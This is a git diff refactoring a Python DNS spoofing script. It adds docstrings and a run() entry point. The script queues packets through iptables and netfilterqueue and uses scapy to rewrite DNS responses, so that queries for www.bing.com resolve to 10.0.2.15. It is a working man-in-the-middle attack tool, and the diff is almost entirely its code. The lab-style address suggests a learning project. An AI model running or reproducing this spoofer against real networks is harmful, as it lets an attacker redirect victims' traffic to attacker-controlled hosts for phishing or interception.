@@ -1,5 +1,3 @@
-#!usr/bin/env python
-
 #########################################################################
 # Author : Dhrumil Mistry
 #########################################################################
@@ -19,11 +17,16 @@ import scapy.all as scapy
 SPOOF_WEBSITE = b'www.bing.com'
 SPOOF_RDATA = b'10.0.2.15'
 
-############################### Functions ############################### 
+
 def forward_packets():
-    '''
-    configures the mitm for incoming request packets
-    into a queue.
+    '''configures the mitm for incoming request packets
+    into a queue
+
+    Args:
+        None
+
+    Returns:
+        None
     '''
 
     # executing the following command
@@ -43,7 +46,13 @@ def forward_packets():
 def reset_config():
     '''
     resets the configurations changed while exectution of the program to 
-    its original configuration.
+    its original configuration
+
+    Args:
+        None
+
+    Returns:
+        None
     '''
     call('sudo iptables --flush', shell=True)
 
@@ -53,7 +62,13 @@ def process_packet(packet):
     '''
     process received packet, everytime a packet is received.
     prints the packet received in the queue and it changes 
-    the DNS response dest ip with your desired ip.
+    the DNS response dest ip with your desired ip
+
+    Args:
+        packet (scapy.IP): IP packet from netfilterqueue/iptables 
+
+    Returns:
+        None
     '''
     scapy_pkt = scapy.IP(packet.get_payload())
 
@@ -81,32 +96,43 @@ def process_packet(packet):
     packet.accept()
 
 
-############################### Main ############################### 
+def run():
+    '''Starts DNS spoofer
 
-print('[*] configuring packet receiver...')
+    Args:
+        None
 
-forward_packets()
-print('[*] packet receiver configured successfully.\n')
+    Returns:
+        None
+    '''
+    print('[*] configuring packet receiver...')
 
-print('[*] Creating Queue to start receiving packets.')
-try:
-    queue = netfilterqueue.NetfilterQueue()
-    # Bind queue with queue-number 0
-    queue.bind(0, process_packet)
-    queue.run()
+    forward_packets()
+    print('[*] packet receiver configured successfully.\n')
 
-except OSError as e:
-    print('[-] Run script with root priviliges.')
-    print(e)
+    print('[*] Creating Queue to start receiving packets.')
+    try:
+        queue = netfilterqueue.NetfilterQueue()
+        # Bind queue with queue-number 0
+        queue.bind(0, process_packet)
+        queue.run()
 
-except KeyboardInterrupt:
-    print('\r[-] Keyboard Interrupt detected!')
+    except OSError as e:
+        print('[-] Run script with root priviliges.')
+        print(e)
 
-except Exception:
-    print('[-] An Exception occurred while creating queue.\n', Exception)
+    except KeyboardInterrupt:
+        print('\r[-] Keyboard Interrupt detected!')
 
-finally:
-    print('[*] Restoring previous configurations.. please be patient...')
-    reset_config()
+    except Exception:
+        print('[-] An Exception occurred while creating queue.\n', Exception)
 
-    print('[-] Program stopped.')
+    finally:
+        print('[*] Restoring previous configurations.. please be patient...')
+        reset_config()
+
+        print('[-] Program stopped.')
+
+
+if __name__ == '__main__':
+    run()
